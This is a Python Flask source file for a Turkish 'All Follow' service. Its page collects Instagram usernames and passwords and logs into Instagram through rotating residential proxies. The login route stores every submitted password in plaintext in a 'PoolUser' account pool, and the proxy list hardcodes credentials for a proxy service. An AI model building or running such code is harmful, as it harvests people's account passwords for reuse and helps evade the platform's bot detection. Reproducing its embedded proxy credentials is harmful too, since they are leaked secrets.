import os
import random
import time
import requests
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_debug.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 🚀 SENİN GÜNCEL PROXY LİSTEN (En son attığın liste)
PROXY_POOL = [
    "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73263145:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84639863:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68182545:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-51767287:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68467738:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-96271173:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-74157191:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-58918651:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
]

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

@app.route('/')
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><title>All Follow | Proxy Debug</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200">
        <div class="bg-[#161b2c] p-8 rounded-[2.5rem] w-full max-w-[380px] border border-slate-800 shadow-2xl text-center">
            <h1 class="text-3xl font-black text-blue-500 mb-2">ALL FOLLOW</h1>
            <p id="proxy-status" class="text-[10px] text-yellow-500 font-bold uppercase mb-8 italic">Proxy Kontrol Ediliyor...</p>
            
            <div class="space-y-4">
                <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600">
                <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 transition-all text-sm tracking-widest uppercase">Giriş Yap ve Test Et</button>
            </div>
            <p id="msg" class="text-[10px] mt-6 font-medium text-slate-400 uppercase tracking-tighter"></p>
        </div>

        <script>
            async function login() {
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const btn=document.getElementById('btn'), msg=document.getElementById('msg');
                if(!u || !p) return;
                btn.disabled = true; btn.innerText = "BAĞLANTI TESTİ...";
                
                try {
                    const r = await fetch('/api/login', {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({u, p})
                    });
                    const d = await r.json();
                    msg.innerText = d.msg;
                    if(d.status === "success") { btn.style.background = "#10b981"; btn.innerText = "BAŞARILI!"; }
                    else { btn.disabled = false; btn.innerText = "YENİDEN DENE"; }
                } catch(e) { msg.innerText = "SUNUCU HATASI!"; btn.disabled = false; }
            }
        </script>
    </body>
    </html>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. PROXY TESTİ (En Önemli Kısım)
    selected_proxy = random.choice(PROXY_POOL)
    proxies = {"http": selected_proxy, "https": selected_proxy}
    
    try:
        # Proxy üzerinden IP'mizi kontrol edelim
        test_req = requests.get("https://api.ipify.org", proxies=proxies, timeout=15)
        proxy_ip = test_req.text
        print(f"Proxy Başarılı! IP: {proxy_ip}")
    except Exception as e:
        return jsonify(status="error", msg=f"Proxy Çalışmıyor! Hata: {str(e)[:40]}... Panelden Whitelist veya Ayarları kontrol et.")

    # 2. INSTAGRAM GİRİŞİ
    cl = Client()
    cl.set_proxy(selected_proxy)
    try:
        time.sleep(2)
        cl.login(u, p)
        user = PoolUser.query.filter_by(username=u).first()
        if not user: user = PoolUser(username=u, password=p); db.session.add(user)
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg=f"Proxy OK ({proxy_ip}) - Giriş Başarılı!")
    except Exception as e:
        err = str(e).lower()
        if "checkpoint" in err: return jsonify(status="error", msg="Proxy OK - Hesap Onay İstiyor.")
        return jsonify(status="error", msg=f"Proxy OK - Insta Reddi: {err[:30]}")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
